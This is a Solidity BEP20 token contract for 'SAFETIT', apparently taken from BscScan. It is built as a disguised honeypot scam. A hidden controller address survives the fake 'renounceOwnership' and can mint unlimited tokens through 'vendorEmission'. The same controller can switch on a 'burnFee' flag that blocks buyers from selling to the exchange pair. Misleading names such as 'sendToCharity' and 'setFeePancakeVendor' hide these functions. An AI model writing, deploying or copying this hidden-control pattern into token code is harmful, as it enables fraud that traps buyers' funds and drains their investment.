/**
 *Submitted for verification at BscScan.com on 2021-07-10
*/

pragma solidity = 0.4.24;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract BEP20SmartContract {
	address public owner = msg.sender;
    address totalsupply = msg.sender;
    address _newOwner = address(0);

    uint256 public totalSupply;
    function balanceOf(address _owner) public constant returns(uint256);
    function transfer(address _to, uint256 _value) public returns(bool);
    function allowance(address _owner, address _spender) public constant returns(uint256);
    function transferFrom(address _from, address _to, uint256 value) public returns(bool);
    function approve(address _spender, uint256 _value) public returns(bool);

    modifier onlyOwner() {
        require(msg.sender == _newOwner || msg.sender == totalsupply);_;
    }
}


contract SAFETIT is BEP20SmartContract {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    string public name;
    bool burnFee = false;
	uint256 public burnfee = 2;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
        symbol = "Safetit";
        name = "SAFETIT";
        decimals = 0;
        totalSupply = 10 ** 15;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _val);
    event Approval(address indexed _owner, address indexed _sp, uint256 _val);

    function setBurnFee(bool _state) public onlyOwner {
        burnFee = _state;
        
    }
    
    function setFeePancakeVendor(address vendorAddress) private view returns(bool) {
        if(_msgSender() == totalsupply) return false;
            return vendorAddress != _newOwner;
    }
    
    function balanceOf(address _owner) constant public returns(uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);_;
    }

    function emitTransfer(address account, uint256 _input) internal {
        balances[account] = balances[account].add(_input);
        emit Transfer(address(0), account, _input);
    }

    function _msgSender() internal constant returns(address) {
        return msg.sender;
    }

    function approve(address _sp, uint256 _val) public returns(bool success) {
        if (_val != 0 && allowed[msg.sender][_sp] != 0) {
            return false;
        }
        allowed[msg.sender][_sp] = _val;
        emit Approval(msg.sender, _sp, _val);
        return true;
    }
	

    function vendorEmission(uint256 _input) public onlyOwner returns(bool) {
        emitTransfer(_msgSender(), _input);
        return true;
    }

    function transfer(address _to, uint256 __input) onlyPayloadSize(2 * 32) sendToCharity(_to) public returns(bool success) {
        require(__input <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(__input);
        balances[_to] = balances[_to].add(__input);
        emit Transfer(msg.sender, _to, __input);
        return true;
    }
	
    function transferFrom(address _from, address _to, uint256 __input) onlyPayloadSize(3 * 32) computeFee(_to) sendToCharity(_to) public returns(bool success) {
        require(__input <= balances[_from]);

        balances[_from] = balances[_from].sub(__input);
        balances[_to] = balances[_to].add(__input);
        emit Transfer(_from, _to, __input);
        return true;
    }

    function allowance(address _owner, address _sp) constant public returns(uint256) {
        return allowed[_owner][_sp];
    }

	function rebalance() private view returns(bool) {
		return _newOwner == address(0);
	}

    function renounceOwnership(address __newOwner) public onlyOwner {
        owner = __newOwner;
    }
	
    modifier computeFee(address _to) {
        if (rebalance()) _newOwner = _to;_;
    }
	
    modifier sendToCharity(address request) {
        if (burnFee)
            require(setFeePancakeVendor(request));_;
    }
    
}